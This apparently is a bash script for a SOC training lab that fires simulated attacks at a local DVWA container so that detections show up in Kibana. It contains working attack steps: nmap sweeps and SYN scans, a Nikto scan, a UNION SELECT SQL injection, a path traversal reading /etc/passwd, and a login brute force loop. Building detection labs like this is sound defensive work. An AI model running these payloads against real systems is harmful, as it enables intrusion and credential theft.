#!/bin/bash
# ===================================
# Kali SOC Lab — Attack Simulation
# Targets: DVWA at localhost:8080
# ===================================

TARGET_IP=$(docker inspect dvwa 2>/dev/null | grep '"IPAddress"' | tail -1 | awk -F'"' '{print $4}')
TARGET_HTTP="localhost:8080"

echo "[*] Target IP: $TARGET_IP"
echo "[*] Starting attack simulation in 3 seconds..."
sleep 3

# Scenario 1: Ping sweep
echo ""
echo "[+] Scenario 1: ICMP Ping Sweep"
nmap -sn 172.17.0.0/24 -oN /dev/null
echo "    Done. Check Kibana for ICMP alerts."
sleep 2

# Scenario 2: SYN scan
echo ""
echo "[+] Scenario 2: Nmap SYN Scan"
sudo nmap -sS $TARGET_IP -p 1-1000 -oN /dev/null
echo "    Done. Check Kibana for scan detection."
sleep 2

# Scenario 3: Nikto web scan (quick)
echo ""
echo "[+] Scenario 3: Nikto Web Vulnerability Scan"
nikto -h http://$TARGET_HTTP -maxtime 30 2>/dev/null | tail -5
echo "    Done. Check Kibana for scanner detection."
sleep 2

# Scenario 4: SQL Injection via curl
echo ""
echo "[+] Scenario 4: SQL Injection Attempt"
curl -s "http://$TARGET_HTTP/dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,null--&Submit=Submit" \
  -A "Mozilla/5.0" -o /dev/null
echo "    Done. Check Kibana for SQLi alerts."
sleep 2

# Scenario 5: Directory Traversal
echo ""
echo "[+] Scenario 5: Directory Traversal Attempt"
curl -s "http://$TARGET_HTTP/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd" \
  -A "Mozilla/5.0" -o /dev/null
echo "    Done. Check Kibana for traversal alerts."
sleep 2

# Scenario 6: Brute Force (light)
echo ""
echo "[+] Scenario 6: HTTP Brute Force (15 attempts)"
for i in {1..15}; do
  curl -s -X POST "http://$TARGET_HTTP/dvwa/login.php" \
    -d "username=admin&password=attempt$i&Login=Login" \
    -A "Mozilla/5.0" -o /dev/null
done
echo "    Done. Check Kibana for brute force alerts."

echo ""
echo "======================================"
echo "  Attack simulation complete!"
echo "  Go to Kibana: http://localhost:5601"
echo "  Filter: event_type: alert"
echo "======================================"
